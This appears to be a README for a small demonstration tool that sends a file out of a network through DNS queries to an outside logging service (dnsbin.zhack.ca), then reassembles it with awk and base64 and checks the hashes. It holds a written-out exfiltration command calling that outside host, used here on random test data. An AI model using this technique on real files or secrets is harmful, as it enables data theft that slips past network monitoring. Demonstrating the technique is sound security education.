# DNSbin data exfiltration test

Just a quick hack to demonstrate how simple it is to exfiltrate data using DNS.

## Create test data to exiltrate

`dd if=/dev/urandom of=test.file bs=256 count=1`


## Create dnsbin

Visit http://dnsbin.zhack.ca and get a hostname

## Exfil

63 is the data block length. DNS names can only be so long.

`./dnsbin.sh XXXXXX.d.zhack.ca 63 test.file`

Watch your browser and see the data appear.

## Carve

Copypaste output from browser and paste into input.txt

`awk -f dnsbin_carve.awk input.txt | tr '_-' '+/' | gbase64 -d > output.bin`

## Compare with original data

`shasum -a 256 test.file output.bin`
